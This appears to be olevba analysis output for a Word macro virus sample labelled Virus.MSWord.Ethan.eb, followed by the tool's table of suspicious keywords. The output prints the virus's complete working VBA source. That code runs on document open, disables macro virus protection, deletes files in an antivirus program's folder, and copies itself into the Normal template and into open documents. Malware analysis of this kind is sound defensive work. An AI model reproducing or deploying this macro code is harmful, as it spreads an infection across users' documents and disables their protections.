olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'$$0000005
Private Sub Document_Open()
VirusProtection = False
SaveNormalPrompt = False
On Error Resume Next
r = Dir("c:\program files\AntiViral Toolkit Pro\*.*")
If r <> "" Then
For c = 1 To 5
Kill "c:\program files\AntiViral Toolkit Pro\" & r
Next c
End If
If Dir(Application.Path & "\$$$.ant", 6) = "" Then
Open (Application.Path & "\$$$.ant") For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(i, 1)
Print #1, a
Next i
Close #1
End If
SetAttr Application.Path & "\$$$.ant", 6
If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "Private Sub Document_Open()" Then
Open Application.Path & "\$$$.ant" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.InsertLines i, a
i = i + 1
Loop
Close #1
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Private Sub Document_Open()" Then
Open Application.Path & "\$$$.ant" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
ActiveDocument.VBProject.VBComponents.Item(1).codemodule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
Else
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

